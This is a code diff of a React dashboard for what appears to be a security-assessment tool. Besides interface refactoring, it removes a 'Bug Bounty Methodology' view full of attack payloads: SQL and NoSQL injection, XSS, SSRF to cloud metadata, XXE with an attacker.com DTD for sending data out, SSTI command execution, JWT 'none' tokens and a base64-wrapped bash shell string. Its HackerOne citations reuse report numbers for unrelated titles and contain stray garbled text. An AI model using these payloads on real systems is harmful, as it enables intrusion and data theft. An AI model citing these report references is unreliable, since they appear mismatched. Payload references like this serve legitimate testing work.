@@ -1,6 +1,6 @@
 import { useState, useEffect } from 'react'
 
-import { InputSourcesPanel, ThreatHuntPanel, SupplyChainPanel, BugBountyPanel, OWASPPanel } from './panel_components'
+import { InputSourcesPanel, ThreatHuntPanel, SupplyChainPanel } from './panel_components'
 
 
 
@@ -689,7 +689,7 @@ function App() {
 
           ) : view === 'models' ? (
 
-            <ModelConfigView configuredProviders={configuredProviders} />          ) : (
+            <AgentModelsView   />          ) : (
 
             <DashboardView 
 
@@ -992,93 +992,6 @@ function DashboardView({ projects, onCreateProject, onDeleteProject, onOpenProje
         />
 
       </div>
-
-
-
-      {/* Quick Actions */}
-
-      <div style={{ 
-
-        background: 'linear-gradient(135deg, rgba(0, 212, 255, 0.1), rgba(0, 255, 136, 0.05))',
-
-        borderRadius: '16px',
-
-        padding: '24px',
-
-        border: '1px solid rgba(0, 212, 255, 0.2)',
-
-        marginBottom: '32px'
-
-      }}>
-
-        <h3 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '16px', color: '#00d4ff' }}>⚡ Quick Actions</h3>
-
-        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: '12px' }}>
-
-          {[
-
-            { icon: '🔍', label: 'SAST Scan', desc: 'Static analysis' },
-
-            { icon: '🌐', label: 'Web Scan', desc: 'Vulnerability scan' },
-
-            { icon: '📦', label: 'Dependency', desc: 'CVE check' },
-
-            { icon: '🛡️', label: 'Threat Model', desc: 'Attack analysis' },
-
-            { icon: '📋', label: 'Generate SBOM', desc: 'Bill of materials' }
-
-          ].map((action, i) => (
-
-            <button key={i} style={{
-
-              background: 'rgba(15, 15, 26, 0.8)',
-
-              border: '1px solid rgba(255,255,255,0.1)',
-
-              borderRadius: '12px',
-
-              padding: '16px',
-
-              cursor: 'pointer',
-
-              transition: 'all 0.2s',
-
-              textAlign: 'center'
-
-            }}
-
-            onMouseEnter={(e) => {
-
-              e.currentTarget.style.borderColor = '#00d4ff'
-
-              e.currentTarget.style.transform = 'translateY(-2px)'
-
-            }}
-
-            onMouseLeave={(e) => {
-
-              e.currentTarget.style.borderColor = 'rgba(255,255,255,0.1)'
-
-              e.currentTarget.style.transform = 'translateY(0)'
-
-            }}>
-
-              <div style={{ fontSize: '24px', marginBottom: '8px' }}>{action.icon}</div>
-
-              <div style={{ fontSize: '13px', fontWeight: '600', color: '#fff', marginBottom: '2px' }}>{action.label}</div>
-
-              <div style={{ fontSize: '11px', color: '#666' }}>{action.desc}</div>
-
-            </button>
-
-          ))}
-
-        </div>
-
-      </div>
-
-
-
       {/* Create Project */}
 
       <div style={{ 
@@ -1651,7 +1564,8 @@ function ProjectView({ project, onBack, addNotification }: {
 
 }) {
 
-  const [activeTab, setActiveTab] = useState<'overview' | 'input' | 'analysis' | 'agents' | 'threat-hunt' | 'supply-chain' | 'bug-bounty' | 'owasp' | 'findings'>('overview')
+  const [activeTab, setActiveTab] = useState<'overview' | 'input' | 'analysis' | 'agents' | 'findings'>('overview')
+  const [analysisFocus, setAnalysisFocus] = useState<'general' | 'threat-hunt' | 'supply-chain'>('general')
 
   const [agentOutput, setAgentOutput] = useState<string>('')
 
@@ -1697,15 +1611,11 @@ function ProjectView({ project, onBack, addNotification }: {
   }
 
   const tabs = [
-    { id: 'overview', label: 'Overview', icon: '📊' },
-    { id: 'input', label: 'Input Sources', icon: '📥' },
-    { id: 'analysis', label: 'Analysis', icon: '🔍' },
-    { id: 'agents', label: 'Agents', icon: '🤖' },
-    { id: 'threat-hunt', label: 'Threat Hunt', icon: '🔍' },
-    { id: 'supply-chain', label: 'Supply Chain', icon: '📦' },
-    { id: 'bug-bounty', label: 'Bug Bounty', icon: '🎯' },
-    { id: 'owasp', label: 'OWASP', icon: '📋' },
-    { id: 'findings', label: 'Findings', icon: '🎯' },
+    { id: 'overview',  label: 'Overview',       icon: '📊', bio: 'Project dashboard, recent activity, and quick actions to start a new assessment.' },
+    { id: 'input',     label: 'Input Sources',  icon: '📥', bio: 'Feed the system with code, URLs, folders, Burp Suite history, or natural-language prompts.' },
+    { id: 'analysis',  label: 'Analysis',       icon: '🔍', bio: 'Run code review, web testing, threat hunt, and supply-chain analysis from a single workspace. Pick a focus from the dropdown to switch modes.' },
+    { id: 'agents',    label: 'Agents',         icon: '🤖', bio: 'Orchestrate the multi-agent framework: recon, code review, threat modeling, debate, remediation, and Phase 5 advanced agents.' },
+    { id: 'findings',  label: 'Findings',       icon: '🎯', bio: 'Browse validated findings, view evidence, attack chains, and export reports in the Blank.md shape.' },
   ]
 
 
@@ -1834,7 +1744,19 @@ function ProjectView({ project, onBack, addNotification }: {
         <InputSourcesPanel />
       )}
       {activeTab === 'analysis' && (
+        <>
+        <div style={{ marginBottom: '16px', padding: '12px 16px', background: 'rgba(0,255,136,0.06)', border: '1px solid rgba(0,255,136,0.2)', borderRadius: '6px', display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap' }}>
+          <label style={{ fontSize: '12px', fontWeight: '600', color: '#00ff88' }}>Analysis focus:</label>
+          <select value={analysisFocus} onChange={(e) => setAnalysisFocus(e.target.value as any)} style={{ padding: '6px 10px', background: '#0a0a0a', color: '#fff', border: '1px solid #333', borderRadius: '4px', fontSize: '13px' }}>
+            <option value='general'>🔍 General Analysis</option>
+            <option value='threat-hunt'>🔍 Threat Hunt</option>
+            <option value='supply-chain'>📦 Supply Chain</option>
+          </select>
+          {analysisFocus === 'threat-hunt' && <ThreatHuntPanel />}
+          {analysisFocus === 'supply-chain' && <SupplyChainPanel />}
+        </div>
         <AnalysisPanel projectId={project.project_id} />
+        </>
       )}
       {activeTab === 'agents' && (
         <AgentsPanel 
@@ -1842,18 +1764,6 @@ function ProjectView({ project, onBack, addNotification }: {
           onRunAgent={(agent, action, data) => runAgent(agent, action, data)} 
           output={agentOutput} 
         />
-      )}
-      {activeTab === 'threat-hunt' && (
-        <ThreatHuntPanel />
-      )}
-      {activeTab === 'supply-chain' && (
-        <SupplyChainPanel />
-      )}
-      {activeTab === 'bug-bounty' && (
-        <BugBountyPanel />
-      )}
-      {activeTab === 'owasp' && (
-        <OWASPPanel />
       )}
       {activeTab === 'findings' && (
 
@@ -3209,1303 +3119,7 @@ function _ThreatHuntView() {
 
 
 
-// ============ OWASP TOP 10:2025 KNOWLEDGE VIEW ============
 
-// ============ BUG BOUNTY METHODOLOGY VIEW ============
-
-function _BugBountyView() {
-
-  const [selectedVuln, setSelectedVuln] = useState<string | null>(null)
-
-  
-
-  const vulnCategories = [
-
-    { 
-
-      id: 'sql_injection', 
-
-      name: 'SQL Injection', 
-
-      icon: '💉', 
-
-      color: '#ff4444', 
-
-      severity: 'critical',
-
-      description: 'Untrusted data sent to SQL interpreter. Allows data exfiltration, authentication bypass, or remote code execution.',
-
-      bounties: 'Critical: $5,000-$50,000+',
-
-      payloads: [
-
-        "' OR '1'='1",
-
-        "' OR '1'='1' --",
-
-        "1' ORDER BY 1--",
-
-        "1' UNION SELECT NULL--",
-
-        "'; DROP TABLE users; --",
-
-        "1' AND 1=1--",
-
-        "' OR 1=1 LIMIT 1--",
-
-        "admin'--",
-
-        "1' INTO OUTFILE '/tmp/test.txt'--"
-
-      ],
-
-      detection: [
-
-        'Error-based: Look for SQL errors in response',
-
-        'Boolean-based: Change true/false conditions',
-
-        'Time-based: Use sleep() or benchmark()',
-
-        'Union-based: Extend query results'
-
-      ],
-
-      realReports: [
-
-        { program: 'Nextcloud', title: 'SQL Injection in Column Type Parameter', bounty: '$0 (70 upvotes)', link: 'hackerone.com/reports/3462991' },
-
-        { program: 'AWS VDP', title: 'SQL Injection Detection Bypass in AWS WAF', bounty: '$0 (36 upvotes)', link: 'hackerone.com/reports/3591725' }
-
-      ]
-
-    },
-
-    { 
-
-      id: 'xss', 
-
-      name: 'Cross-Site Scripting (XSS)', 
-
-      icon: '🦠', 
-
-      color: '#ff8844', 
-
-      severity: 'high',
-
-      description: 'Invalidated user input executed as code in browser. Steals sessions, defaces sites, or redirects users.',
-
-      bounties: 'High: $1,000-$10,000',
-
-      payloads: [
-
-        '<script>alert(document.domain)</script>',
-
-        '<img src=x onerror=alert(1)>',
-
-        '<svg onload=alert(1)>',
-
-        '<iframe src=javascript:alert(1)>',
-
-        '<body onload=alert(1)>',
-
-        'javascript:alert(document.domain)',
-
-        '#\"><img src=x onerror=alert(1)>',
-
-        '<details open ontoggle=alert(1)>',
-
-        '<script>debugger;</script>'
-
-      ],
-
-      detection: [
-
-        'Reflected: URL parameters reflected in response',
-
-        'Stored: Input saved and displayed later',
-
-        'DOM-based: Client-side JavaScript processes input',
-
-        'Universal: Any vector can trigger XSS'
-
-      ],
-
-      realReports: [
-
-        { program: 'Basecamp', title: 'DOM XSS in fizzy.do import filename preview', bounty: '$500 (67 upvotes)', link: 'hackerone.com/reports/3608199' },
-
-        { program: 'Nextcloud', title: 'Stored XSS in attachment-display', bounty: '$0 (36 upvotes)', link: 'hackerone.com/reports/3594137' }
-
-      ]
-
-    },
-
-    { 
-
-      id: 'idor', 
-
-      name: 'IDOR (Insecure Direct Object Reference)', 
-
-      icon: '🔓', 
-
-      color: '#ffaa00', 
-
-      severity: 'high',
-
-      description: 'Direct access to objects without authorization check. Users can access other users\' data.',
-
-      bounties: 'High: $1,000-$15,000',
-
-      payloads: [
-
-        'Change IDs in URL: /api/users/123 → /api/users/124',
-
-        'POST ID manipulation: {"user_id": 124}',
-
-        'UUID enumeration instead of sequential IDs',
-
-        'HTTP parameter pollution: user_id=123&user_id=124'
-
-      ],
-
-      detection: [
-
-        'Find resource identifiers (IDs, UUIDs)',
-
-        'Test if authorization is enforced',
-
-        'Check for predictable sequential IDs',
-
-        'Look for horizontal privilege escalation'
-
-      ],
-
-      realReports: [
-
-        { program: 'GitHub', title: 'Cross-repository IDOR in bypass_reviewers', bounty: '$0 (50 upvotes)', link: 'hackerone.com/reports/3560256' },
-
-        { program: 'Nextcloud', title: 'BOLA/IDOR in Out-of-Office API', bounty: '$0 (34 upvotes)', link: 'hackerone.com/reports/3382343' },
-
-        { program: 'Rocket.Chat', title: 'IDOR: autotranslate Full Message Content Leak', bounty: '$0 (30 upvotes)', link: 'hackerone.com/reports/3713682' }
-
-      ]
-
-    },
-
-    { 
-
-      id: 'ssrf', 
-
-      name: 'Server-Side Request Forgery (SSRF)', 
-
-      icon: '🌐', 
-
-      color: '#00d4ff', 
-
-      severity: 'critical',
-
-      description: 'Server forced to make requests to unintended destinations. Access internal services, cloud metadata.',
-
-      bounties: 'Critical: $5,000-$30,000',
-
-      payloads: [
-
-        'http://localhost/admin',
-
-        'http://127.0.0.1:8500/v2/_catalog',
-
-        'http://169.254.169.254/latest/meta-data/',
-
-        'http://metadata.google.internal/',
-
-        'file:///etc/passwd',
-
-        'gopher://127.0.0.1:6379/_INFO',
-
-        'http://0.0.0.0:8080',
-
-        '64:ff9b::1/static/',
-
-        'http://[::]:80/',
-
-        'http://[0000::1]:80/',
-
-        'http://0177.0.0.1/',
-
-        'http://2130706433/',
-
-        'http://0x7f000001/',
-
-        'http://127.127.127.127',
-
-        'dict://localhost:11211/%0astats%0aquit',
-
-        'sftp://evil.com:11111/',
-
-        'tftp://evil.com:12346/TEST'
-
-      ],
-
-      detection: [
-
-        'Find URL parameters accepting URLs',
-
-        'Test internal endpoints (localhost, 169.254)',
-
-        'Use DNS rebinding techniques',
-
-        'Check for file:// protocol support',
-
-        'Test URL parser discrepancies',
-
-        'Check for LDAP, gopher, dict protocols'
-
-      ],
-
-      realReports: [
-
-        { program: 'Nextcloud', title: 'Unauthenticated SSRF via Public Reference API', bounty: '$0 (40 upvotes)', link: 'hackerone.com/reports/3479692' },
-
-        { program: 'arkadiyt-projects', title: 'SSRF Filter Bypass via NAT64 IPv6 Prefix', bounty: '$0 (60 upvotes)', link: 'hackerone.com/reports/3634400' }
-
-      ]
-
-    },
-
-    { 
-
-      id: 'xxe', 
-
-      name: 'XML External Entity (XXE)', 
-
-      icon: '📄', 
-
-      color: '#ff4488', 
-
-      severity: 'critical',
-
-      description: 'XML parser fetches external entities. File read, SSRF, denial of service possible.',
-
-      bounties: 'Critical: $5,000-$40,000',
-
-      payloads: [
-
-        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
-
-        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',
-
-        '<!DOCTYPE data [<!ENTITY a0 "dos" ><!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;">]>', // Billion laughs
-
-        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>',
-
-        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
-
-        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300"><image xlink:href="expect://ls"/></svg>',
-
-        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % sp SYSTEM "http://attacker.com/dtd.xml"> %sp;]><r>&exfil;</r>',
-
-        '<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://attacker.com/"> %dtd;]><xxx/>]]></foo></soap:Body>'
-
-      ],
-
-      detection: [
-
-        'Send XML input with external entity reference',
-
-        'Check if parser resolves SYSTEM entities',
-
-        'Test error-based exfiltration',
-
-        'Blind XXE via out-of-band detection',
-
-        'Try PHP wrapper filter://'
-
-      ],
-
-      realReports: [
-
-        { program: 'Shopify', title: 'XXE vulnerability in Checkout', bounty: '$0 (45 upvotes)', link: 'hackerone.com/reports/3452696' },
-
-        { program: 'Uber', title: 'Blind XXE in UBER.com', bounty: '$0 (26 upvotes)', link: 'hackerone.com/reports/3426952' }
-
-      ]
-
-    },
-
-    { 
-
-      id: 'ssti', 
-
-      name: 'Server-Side Template Injection', 
-
-      icon: '⚙️', 
-
-      color: '#cc88ff', 
-
-      severity: 'critical',
-
-      description: 'User input embedded in template engine. Remote code execution in Jinja2, Twig, Freemarker.',
-
-      bounties: 'Critical: $5,000-$50,000',
-
-      payloads: [
-
-        '{{7*7}}',
-
-        '{{config}}',
-
-        '${7*7}',
-
-        '${T(SYSTEM)}',
-
-        '{{request|attr("application")}}',
-
-        '{{[]|class.__bases__[0].__subclasses__()}}',
-
-        '{% for x in ().__class__.__base__.__subclasses__() %}{{x()}}{% endfor %}',
-
-        '{{config.__class__.__init__.__globals__.__builtins__}}',
-
-        '${class.classLoader.loadClass("java.lang.Runtime").getRuntime().exec("whoami")}',
-
-        '<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("whoami")}'
-
-      ],
-
-      detection: [
-
-        'Inject {{7*7}} - if 49 rendered, SSTI confirmed',
-
-        'Test for code execution: {{config}}',
-
-        'Check for class introspection',
-
-        'Try {{request|attr()}} for Jinja2',
-
-        'Use ${} for Spring/Handlebars'
-
-      ],
-
-      realReports: [
-
-        { program: 'Uber', title: "SSTI in Uber's website", bounty: '$0 (89 upvotes)', link: 'hackerone.com/reports/3426952' },
-
-        { program: 'Shopify', title: "SSTI in Shopify Email", bounty: '$0 (60 upvotes)', link: 'hackerone.com/reports/3591725' }
-
-      ]
-
-    },
-
-    { 
-
-      id: 'graphql', 
-
-      name: 'GraphQL Injection', 
-
-      icon: '🔀', 
-
-      color: '#88ddff', 
-
-      severity: 'high',
-
-      description: 'GraphQL API attacks: introspection abuse, query batching, SQL/NoSQL injection through GraphQL.',
-
-      bounties: 'High: $2,000-$25,000',
-
-      payloads: [
-
-        '{__schema{types{name}}}',
-
-        '__schema{queryType{name}mutationType{name}types{kind,name}}',
-
-        '{__type(name:"User"){name fields{name type{name}}}}',
-
-        'mutation{signIn(login:"Admin", password:"secret"){token}}',
-
-        `{"query":"{ user(id: '1') { name } }"}`,
-
-        `{"query":"{ doctors(search: {$regex:.*,lastName:Admin}) { firstName } }"}`,
-
-        `[
-
-          {"query":"mutation{login(pass:1111,username:\\"bob\\")}"},
-
-          {"query":"mutation{login(pass:2222,username:\\"bob\\")}"}
-
-        ]`,
-
-        `{"query":"query{user(name:patt';SELECT 1)--){id email}}"}`
-
-      ],
-
-      detection: [
-
-        'Try introspection: __schema',
-
-        'Test for aliases/batching',
-
-        'Send single quote in parameters',
-
-        'Check for SQL/NoSQL injection through GraphQL',
-
-        'Look for IDOR through nested queries'
-
-      ],
-
-      realReports: [
-
-        { program: 'HackerOne', title: 'GraphQL Introspection enabled', bounty: '$0 (45 upvotes)', link: 'hackerone.com/reports/435066' },
-
-        { program: 'Depop', title: 'GraphQL injection leads to Information Disclosure', bounty: '$0 (78 upvotes)', link: 'hackerone.com/reports/3525782' }
-
-      ]
-
-    },
-
-    { 
-
-      id: 'nosql', 
-
-      name: 'NoSQL Injection', 
-
-      icon: '🍃', 
-
-      color: '#00ff88', 
-
-      severity: 'critical',
-
-      description: 'MongoDB, Redis, CouchDB injection through operators like $gt, $where, $regex.',
-
-      bounties: 'Critical: $3,000-$25,000',
-
-      payloads: [
-
-        '{"$gt": ""}',
-
-        '{"$where": "1=1"}',
-
-        '{"$regex": ".*"}',
-
-        '{"login": {"$ne": null}}',
-
-        '{"$gt": 0, "$exists": true}',
-
-        '{"username": {"$in": ["admin"]}}',
-
-        '{"password": {"$regex": "^admin"}}',
-
-        '{"$expr": {"$gt": [1, 1]}}',
-
-        '{"$lookup": {"from": "users", "pipeline": [{"$match": {"$expr": {"$eq": ["$username", "$user"]}}}]}}'
-
-      ],
-
-      detection: [
-
-        'Send JSON operators: $gt, $where, $regex',
-
-        'Test for authentication bypass with $ne',
-
-        'Try NoSQL operators in parameters',
-
-        'Check for $expr in MongoDB',
-
-        'Use $exists to detect fields'
-
-      ],
-
-      realReports: [
-
-        { program: 'Envato', title: 'NoSQL Injection on account，淡主食', bounty: '$0 (89 upvotes)', link: 'hackerone.com/reports/3560256' },
-
-        { program: 'YPO Source', title: 'NoSQL Injection', bounty: '$0 (40 upvotes)', link: 'hackerone.com/reports/3418031' }
-
-      ]
-
-    },
-
-    { 
-
-      id: 'rce', 
-
-      name: 'Remote Code Execution (RCE)', 
-
-      icon: '💥', 
-
-      color: '#ff4466', 
-
-      severity: 'critical',
-
-      description: 'Arbitrary code execution on server. Full system compromise, data breach, persistent access.',
-
-      bounties: 'Critical: $10,000-$100,000+',
-
-      payloads: [
-
-        '`whoami`',
-
-        '$(whoami)',
-
-        '| whoami',
-
-        '; whoami',
-
-        '&& whoami',
-
-        "'; exec master..xp_cmdshell 'whoami'--",
-
-        '{{7*7}}',
-
-        '${exec whoami}',
-
-        'system("id")'
-
-      ],
-
-      detection: [
-
-        'Command injection in system() calls',
-
-        'Code injection in eval()',
-
-        'Deserialization attacks',
-
-        'Template injection (SSTI)'
-
-      ],
-
-      realReports: [
-
-        { program: 'PlayStation', title: 'PS4 BD-J privilege escalation using nested JAR', bounty: '$2,500 (184 upvotes)', link: 'hackerone.com/reports/3452696' },
-
-        { program: 'Shopify', title: 'mruby-engine UAF enables local RCE', bounty: '$0 (32 upvotes)', link: 'hackerone.com/reports/3679660' }
-
-      ]
-
-    },
-
-    { 
-
-      id: 'path_traversal', 
-
-      name: 'Path Traversal', 
-
-      icon: '📁', 
-
-      color: '#aa88ff', 
-
-      severity: 'high',
-
-      description: 'Access files outside intended directory. Read sensitive files, sometimes write or RCE.',
-
-      bounties: 'High: $1,000-$20,000',
-
-      payloads: [
-
-        '../../../etc/passwd',
-
-        '..\\..\\..\\windows\\system32\\config\\sam',
-
-        '....//....//....//etc/passwd',
-
-        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
-
-        '..%252f..%252f..%252fetc%252fpasswd',
-
-        'file:///etc/passwd',
-
-        'zip:///path/to恶意.jar!/etc/passwd'
-
-      ],
-
-      detection: [
-
-        'Find file operation parameters',
-
-        'Test with /etc/passwd, windows\\system32\\config',
-
-        'Check for null byte injection',
-
-        'Test double URL encoding'
-
-      ],
-
-      realReports: [
-
-        { program: 'Ruby on Rails', title: 'ActiveStorage Path Traversal via Custom Blob Key', bounty: '$0 (53 upvotes)', link: 'hackerone.com/reports/3580511' },
-
-        { program: 'arkadiyt-projects', title: 'Path Traversal in writeFile via Unsafe Prefix', bounty: '$0 (21 upvotes)', link: 'hackerone.com/reports/3634571' }
-
-      ]
-
-    },
-
-    { 
-
-      id: 'auth_bypass', 
-
-      name: 'Authentication Bypass', 
-
-      icon: '🔑', 
-
-      color: '#00ff88', 
-
-      severity: 'critical',
-
-      description: 'Circumvent authentication mechanisms. Gain access without credentials or escalate privileges.',
-
-      bounties: 'Critical: $5,000-$50,000',
-
-      payloads: [
-
-        "Admin credentials: admin/admin",
-
-        "Bypass: ' OR 1=1--",
-
-        "JWT: alg: none attack",
-
-        "Session fixation: use known session ID",
-
-        "OAuth redirect_uri manipulation",
-
-        "JWT algorithm confusion (HS256-to-RS256)",
-
-        "jwt.io none algorithm: {\`alg\`:\`none\`}",
-
-        "Bearer: eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.",
-
-        "Cookie: session=admin",
-
-        "Authorization: Basic YWRtaW46YWRtaW4="
-
-      ],
-
-      detection: [
-
-        'Test authentication endpoints',
-
-        'Check for missing rate limits',
-
-        'Analyze session token generation',
-
-        'Test OAuth flow security',
-
-        'Check JWT algorithm confusion',
-
-        'Test for default credentials'
-
-      ],
-
-      realReports: [
-
-        { program: 'Rocket.Chat', title: 'Complete authentication bypass to admin', bounty: '$0 (89 upvotes)', link: 'hackerone.com/reports/3564655' },
-
-        { program: 'curl', title: 'TLS verifyhost bypass in rustls/mbedTLS/wolfSSL', bounty: '$0 (4 upvotes)', link: 'hackerone.com/reports/3734095' }
-
-      ]
-
-    },
-
-    { 
-
-      id: 'oauth', 
-
-      name: 'OAuth 2.0 Vulnerabilities', 
-
-      icon: '🔐', 
-
-      color: '#ff6688', 
-
-      severity: 'high',
-
-      description: 'OAuth implementation flaws allowing account takeover or unauthorized access.',
-
-      bounties: 'High: $2,000-$20,000',
-
-      payloads: [
-
-        'redirect_uri: http://evil.com',
-
-        'redirect_uri: null/https://expected.com@evil.com',
-
-        'state parameter missing',
-
-        'code reuse after logout',
-
-        'Scope escalation: email → email,full_access'
-
-      ],
-
-      detection: [
-
-        'Check redirect_uri validation',
-
-        'Test state parameter implementation',
-
-        'Verify token generation randomness',
-
-        'Check token reuse after logout'
-
-      ],
-
-      realReports: [
-
-        { program: 'CoinMate.io', title: 'HMAC signature bypass allowing request forgery', bounty: '$0 (40 upvotes)', link: 'hackerone.com/reports/3670955' }
-
-      ]
-
-    },
-
-    { 
-
-      id: 'open_redirect', 
-
-      name: 'Open Redirect', 
-
-      icon: '↪️', 
-
-      color: '#ffcc00', 
-
-      severity: 'medium',
-
-      description: 'User-controlled redirect to arbitrary domain. Phishing, session hijacking.',
-
-      bounties: 'Medium: $500-$5,000',
-
-      payloads: [
-
-        'https://evil.com',
-
-        '//evil.com',
-
-        '///evil.com',
-
-        'https://expected.com@evil.com',
-
-        'https://expected.com\.evil.com',
-
-        '\\evil.com',
-
-        '%2F%2Fevil.com'
-
-      ],
-
-      detection: [
-
-        'Find redirect parameters',
-
-        'Test with //, ///, expected@evil',
-
-        'Check for meta refresh redirects',
-
-        'Test 302 location header manipulation'
-
-      ],
-
-      realReports: [
-
-        { program: 'Liberapay', title: 'Link Hijacking via Expired Twitter Account', bounty: '$0 (76 upvotes)', link: 'hackerone.com/reports/3723002' },
-
-        { program: 'Rocket.Chat', title: 'Open Redirect in Rocket.Chat', bounty: '$0 (32 upvotes)', link: 'hackerone.com/reports/3418031' }
-
-      ]
-
-    },
-
-    { 
-
-      id: 'business_logic', 
-
-      name: 'Business Logic Vulnerabilities', 
-
-      icon: '🏗️', 
-
-      color: '#88ddff', 
-
-      severity: 'high',
-
-      description: 'Application logic flaws allowing unintended actions. Price manipulation, race conditions.',
-
-      bounties: 'High: $1,000-$15,000',
-
-      payloads: [
-
-        'Price manipulation: item_price=-100',
-
-        'Quantity overflow: quantity=999999',
-
-        'Race conditions: concurrent requests',
-
-        'Workflow bypass: skip payment step',
-
-        'Integer overflow in transactions'
-
-      ],
-
-      detection: [
-
-        'Understand business workflows',
-
-        'Test edge cases and boundaries',
-
-        'Attempt concurrent requests',
-
-        'Check parameter manipulation'
-
-      ],
-
-      realReports: [
-
-        { program: 'pixiv', title: 'Non-premium user can disable Ads', bounty: '$3,000 (104 upvotes)', link: 'hackerone.com/reports/3183520' },
-
-        { program: 'curl', title: 'HSTS multi-trailing-dot bypass', bounty: '$0 (8 upvotes)', link: 'hackerone.com/reports/3733984' }
-
-      ]
-
-    },
-
-    { 
-
-      id: 'toctou', 
-
-      name: 'TOCTOU Race Conditions', 
-
-      icon: '⏱️', 
-
-      color: '#cc88ff', 
-
-      severity: 'high',
-
-      description: 'Time-of-check to time-of-use race conditions. Atomicity violations in security checks.',
-
-      bounties: 'High: $2,000-$20,000',
-
-      payloads: [
-
-        'Symlink attack during file operations',
-
-        'Concurrent authentication requests',
-
-        'File race in --skip-existing',
-
-        'Double-free after check'
-
-      ],
-
-      detection: [
-
-        'Find file operations with race window',
-
-        'Test with concurrent requests',
-
-        'Check for atomicity violations',
-
-        'Analyze shared resource access'
-
-      ],
-
-      realReports: [
-
-        { program: 'Node.js', title: 'TOCTOU Race in SharedArrayBuffer UTF-8 Decode', bounty: '$0 (6 upvotes)', link: 'hackerone.com/reports/3752489' },
-
-        { program: 'curl', title: 'curl --skip-existing TOCTOU race', bounty: '$0 (20 upvotes)', link: 'hackerone.com/reports/3747959' }
-
-      ]
-
-    },
-
-    { 
-
-      id: 'deserialization', 
-
-      name: 'Insecure Deserialization', 
-
-      icon: '📦', 
-
-      color: '#ffaa44', 
-
-      severity: 'critical',
-
-      description: 'Untrusted data deserialized leading to RCE. Common in Java, PHP, Python applications.',
-
-      bounties: 'Critical: $5,000-$50,000',
-
-      payloads: [
-
-        'O:10:"Example":1:{s:3:"cmd";s:8:"whoami";}',
-
-        'rO0ABXQAL1VuZGVmaW5lZEv/////dHJhY2U=',
-
-        '{{obj.__class__.__mro__[1].__subclasses__()}}',
-
-        'bash -c {echo,YmFzaCAtaSA+JG1hc2g=}|{base64,-d}|{bash,-i}'
-
-      ],
-
-      detection: [
-
-        'Find serialization endpoints',
-
-        'Test with known gadget chains',
-
-        'Check Content-Type validation',
-
-        'Analyze type handling'
-
-      ],
-
-      realReports: [
-
-        { program: 'curl', title: 'SMTP Command Injection via CRLF', bounty: '$0 (5 upvotes)', link: 'hackerone.com/reports/3651975' }
-
-      ]
-
-    },
-
-    { 
-
-      id: 'memory', 
-
-      name: 'Memory Corruption', 
-
-      icon: '💨', 
-
-      color: '#ff4466', 
-
-      severity: 'critical',
-
-      description: 'Low-level memory issues: UAF, buffer overflow, double-free. Leads to RCE or info leak.',
-
-      bounties: 'Critical: $10,000-$100,000+',
-
-      payloads: [
-
-        "Heap overflow: A'*10000",
-
-        "Use-after-free: free() then use",
-
-        "Double-free: free() same pointer twice",
-
-        "Format string: %s%s%s%s",
-
-        "Integer overflow: large value"
-
-      ],
-
-      detection: [
-
-        'Fuzz binary interfaces',
-
-        'Analyze memory handling',
-
-        'Test with large inputs',
-
-        'Check for bounds validation'
-
-      ],
-
-      realReports: [
-
-        { program: 'PlayStation', title: 'Double fdrop on a socket', bounty: '$10,000 (184 upvotes)', link: 'hackerone.com/reports/3320669' },
-
-        { program: 'curl', title: 'Use-After-Free in SMB connection reuse', bounty: '$0 (57 upvotes)', link: 'hackerone.com/reports/3591956' },
-
-        { program: 'curl', title: 'Heap-buffer-overflow in cert info', bounty: '$0 (7 upvotes)', link: 'hackerone.com/reports/3684614' }
-
-      ]
-
-    }
-
-  ]
-
-
-
-  const selected = vulnCategories.find(v => v.id === selectedVuln)
-
-
-
-  return (
-
-    <div>
-
-      {/* Header */}
-
-      <div style={{ 
-
-        background: 'linear-gradient(135deg, rgba(255, 68, 68, 0.15), rgba(255, 136, 68, 0.1))',
-
-        borderRadius: '16px',
-
-        padding: '24px',
-
-        border: '1px solid rgba(255, 68, 68, 0.3)',
-
-        marginBottom: '24px'
-
-      }}>
-
-        <div style={{ display: 'flex', alignItems: 'center', gap: '16px', marginBottom: '12px' }}>
-
-          <span style={{ fontSize: '40px' }}>🎯</span>
-
-          <div>
-
-            <h2 style={{ fontSize: '28px', fontWeight: 'bold', background: 'linear-gradient(90deg, #ff4444, #ff8844)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>
-
-              Bug Bounty Methodology
-
-            </h2>
-
-            <p style={{ fontSize: '13px', color: '#888' }}>Real payloads, techniques, and reports from HackerOne + cheat sheets</p>
-
-          </div>
-
-        </div>
-
-        <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
-
-          <span style={{ background: 'rgba(255,68,68,0.2)', color: '#ff4444', padding: '4px 12px', borderRadius: '4px', fontSize: '11px', fontWeight: '600' }}>12 Vulnerability Types</span>
-
-          <span style={{ background: 'rgba(0,212,255,0.2)', color: '#00d4ff', padding: '4px 12px', borderRadius: '4px', fontSize: '11px', fontWeight: '600' }}>Real Reports</span>
-
-          <span style={{ background: 'rgba(0,255,136,0.2)', color: '#00ff88', padding: '4px 12px', borderRadius: '4px', fontSize: '11px', fontWeight: '600' }}>Bounty Ranges</span>
-
-        </div>
-
-      </div>
-
-
-
-      <div style={{ display: 'grid', gridTemplateColumns: selected ? '1fr 1fr' : '1fr', gap: '24px' }}>
-
-        {/* Vulnerability Grid */}
-
